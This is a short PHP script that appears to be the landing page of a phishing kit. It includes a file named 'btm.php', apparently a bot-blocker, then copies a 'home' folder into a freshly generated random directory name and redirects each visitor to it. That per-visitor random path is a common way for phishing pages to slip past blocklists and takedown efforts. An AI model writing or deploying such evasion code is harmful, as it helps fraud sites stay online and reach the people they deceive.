<?php

include "btm.php";
	$random=rand(0,10000000);
	$md5=md5("$random");
	$base=base64_encode($md5);
	$dst=md5("$base");
	$dst2 = substr(md5($dst) , -9);
	$dst  = strtolower($dst2 );
	function recurse_copy($src,$dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
	if (( $file != '.' ) && ( $file != '..' )) {
	if ( is_dir($src . '/' . $file) ) {
	recurse_copy($src . '/' . $file,$dst . '/' . $file);
	}
	else {
	copy($src . '/' . $file,$dst . '/' . $file);
	}
	}
	}
	closedir($dir);
	}
$src="home";
recurse_copy( $src, $dst );
header("location:$dst");
?>